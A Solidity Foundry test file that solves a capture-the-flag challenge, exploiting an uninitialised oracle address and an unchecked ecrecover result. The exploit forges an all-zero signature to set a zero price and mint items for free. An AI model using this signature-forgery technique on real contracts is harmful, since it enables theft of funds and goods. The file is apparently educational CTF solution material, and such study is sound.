// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./utils/EkoBaseTest.sol";

import "src/Eko/ChallengeMetaverseSupermarket.sol";
import "src/Eko/ChallengeMetaverseSupermarket.factory.sol";

contract MetaverseSupermarketTest is EkoBaseTest {
    InflaStore store;

    function preSetupHook() internal override {
        super.preSetupHook();

        /* IMPLEMENT YOUR PRE SETUP */

        // Init the challenge
        factory = new ChallengeMetaverseSupermarketFactory();
        challenges = factory.deploy(player);
        store = InflaStore(challenges[0]);
    }

    function runExploit() internal override {
        // When a new `InflaStore` is created, the contract does not initialize the `oracle` address
        // the `ChallengeMetaverseSupermarketFactory` factory never call the `setOracle` method updating the oracle
        // So `oracle` remain with the default value that is `address(0)`

        // Now if you have followed all my previous CTF blog posts you should already know how ECDSA works
        // Inside the `_validateOraclePrice` function of `InflaStore` (used to validate the oracle price signature)
        // they checks two things
        // 1) the `v` value must be equal to 27 or 28 (checked internally by `_recover` for signature malleability)
        // 2) the `signer` of the message must be equal to the `oracle`
        // The problem is that `ecrecover` (an EVM precompiled function) will not cover all the security checks
        // you should do as a smart contract developer. The only role of that function is to return 
        // the return the address from the given signature by calculating a recovery function of ECDSA.
        // Basically, given a signature (v, r, s) and a signed message it returns who has signed it.
        // When the function fails to do that (malformed hash, invalid signature and so on)
        // it will return `address(0)` that should be treated as an error and revert immediately

        // To solve the challenge, we just need to be able to set the oracle price of the Meal
        // to be equal to zero and execute some free mint (well will still pay for gas but still...)

        // Create an Oracle Price using the current block number in order to be able to execute the transaction
        // without reverting (`_validateOraclePrice` reverts if the price is too old)
        // and set the oracle price to zero (free mint yay!)
        OraclePrice memory oraclePrice = OraclePrice({
            blockNumber: block.number,
            price: 0
        });

        // Now we build a signature that just need to pass the `v` test (it can be only 27 and 28)
        // And fail all the `ecrecover` internal test to make it returns `address(0)`
        Signature memory signature = Signature({
            v: 27,
            r: bytes32(""),
            s: bytes32("")
        });

        // Now that we have prepared the ground we can just simply start minting our free Meals!
        // Note that we could mint those in an infinite loop because now the price is zero!
        for( uint i = 0; i < 20; i++ ) {
            vm.prank(player);
            store.buyUsingOracle(oraclePrice, signature);
        }
    }
}
